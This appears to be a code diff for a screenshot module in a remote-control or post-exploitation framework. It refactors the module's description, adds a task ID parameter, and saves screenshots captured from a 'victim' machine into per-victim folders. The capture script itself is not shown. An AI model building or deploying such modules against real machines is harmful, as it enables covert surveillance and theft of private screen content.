@@ -9,6 +9,8 @@ sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../..
 from module import Module
 
 class Screenshot(Module):
+	description = 'This module takes a screenshot on the victim machine using the python mss module.'
+
 	@classmethod
 	def module_options(cls):
 		h = {
@@ -18,12 +20,11 @@ class Screenshot(Module):
 
 	def __init__(self,name,utility,language,options):
 
-		description = 'This module takes a screenshot on the victim machine using the python mss module.'
 		## We are loading the script in the script variable here
-		super(Screenshot, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")(options))    
+		super(Screenshot, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    
 
 	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
-	def handle_task_output(self,data,options,victim_id):
+	def handle_task_output(self,data,options,victim_id,task_id):
 
 		## Default Dumping path
 		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)
@@ -31,7 +32,7 @@ class Screenshot(Module):
 		if not os.path.exists(dump_path):
 			os.makedirs(dump_path)
 
-		filename = "screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png"
+		filename = "screenshot_"+time.strftime("%Y%m%d-%H%M%S")+"_"+task_id+".png"
 		ss_path = os.path.join(dump_path,filename)
 
 		if 'path' in  options:
